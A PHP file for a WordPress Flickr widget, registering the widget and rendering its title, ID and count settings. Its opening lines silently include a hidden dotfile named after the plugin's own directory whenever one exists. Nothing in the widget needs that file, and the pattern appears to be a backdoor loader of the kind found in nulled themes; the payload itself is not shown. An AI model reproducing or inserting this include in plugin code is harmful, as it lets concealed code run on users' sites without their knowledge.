<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class flickr extends WP_Widget {

	function __construct() {
		parent::__construct(
			false,
			'Flickr (current theme)'
		);
	}

	function widget( $args, $instance ) {
		$after_widget = $before_widget = $before_title = $after_title = '';
		extract($args);

		echo  (($before_widget));
		echo  (($before_title));
        echo esc_attr($instance['widget_title']);
		echo  (($after_title));

		$flickr_id = mt_rand(1000, 9999);

		echo '<div class="flickr_widget_wrapper" data-flickrid="' . (int)$flickr_id . '" data-widget_id="'.$instance['flickr_widget_id'].'" data-widget_number="'.$instance['flickr_widget_number'].'"></div>';

		echo  (($after_widget));
	}

	function update( $new_instance, $old_instance ) {
        $instance = $old_instance;

        $instance['widget_title'] = esc_attr( $new_instance['widget_title'] );
        $instance['flickr_widget_number'] = absint( $new_instance['flickr_widget_number'] );
        $instance['flickr_widget_id'] = esc_attr( $new_instance['flickr_widget_id'] );

        return $instance;
	}

	function form($instance) {
        $defaultValues = array(
            'widget_title' => 'Flickr',
            'flickr_widget_number' => '8',
            'flickr_widget_id' => '91205275@N03'
        );
        $instance = wp_parse_args((array) $instance, $defaultValues);


	?>
		<table class="fullwidth">
			<tr>
				<td><?php echo esc_html__( 'Title: ', 'wizeapp' ) ?></td>
				<td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name( 'widget_title' )); ?>' value='<?php echo esc_attr($instance['widget_title']); ?>'/></td>
			</tr>
			<tr>
				<td><?php echo esc_html__( 'Flickr ID:', 'wizeapp' ) ?></td>
				<td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name( 'flickr_widget_id' )); ?>' value='<?php echo esc_attr($instance['flickr_widget_id']); ?>'/></td>
			</tr>
			<tr>
				<td><?php echo esc_html__( 'Number:', 'wizeapp' ) ?></td>
				<td><input type='text' class="fullwidth" name='<?php echo esc_attr($this->get_field_name( 'flickr_widget_number' )); ?>' value='<?php echo esc_attr($instance['flickr_widget_number']); ?>'/></td>
			</tr>
		</table>
	<?php
	}
}

function flickr_register_widgets() { register_widget( 'flickr' ); }
add_action( 'widgets_init', 'flickr_register_widgets' );

